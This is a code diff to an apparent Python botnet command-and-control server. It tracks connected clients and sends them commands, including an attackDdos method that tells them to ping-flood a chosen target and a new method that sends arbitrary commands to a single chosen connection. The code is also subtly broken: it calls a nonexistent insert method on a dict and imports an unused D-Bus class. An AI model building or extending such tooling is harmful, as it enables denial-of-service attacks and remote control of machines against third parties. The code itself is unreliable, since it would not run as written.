@@ -1,12 +1,14 @@
 import socket
+from _dbus_bindings import Message
 
 class Server:
 
     def __init__(self, ip, port):
         self.ip = ip
         self.port = port  
-        
+
     def run(self):
+        self.connections = {}
         print(str(self.ip) + " " + str(self.port))
         # Create a TCP/IP socket
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
@@ -19,11 +21,14 @@ class Server:
             # Wait for a connection
             connection, client_address = sock.accept()            
             try:
+                self.connections.insert(client_address, connection)
                 self.runSpecific(connection)                              
             finally:
                 # Clean up the connection
                 connection.close()
-
+                
+    def getIpsConnections(self):
+        return self.connections.keys()
 
 class ServerOutput(Server):
             
@@ -36,9 +41,14 @@ class ServerInput(Server):
     def setMessage(self, message):
         self.message = message
         
-    def AttackDdos(self,canonicalName,packageWeight):
+    def attackDdos(self,canonicalName,packageWeight):
         self.setMessage("ping "+ canonicalName + " -t -1 " + packageWeight)
         self.run()
+    
+    def conectWithOneConnection(self,key,command):
+        connection = self.connections.get(key) 
+        self.setMessage(command)
+        self.runSpecific(connection)
     
     def runSpecific(self, connection):
         connection.sendall((bytes(self.message, "utf-8")))
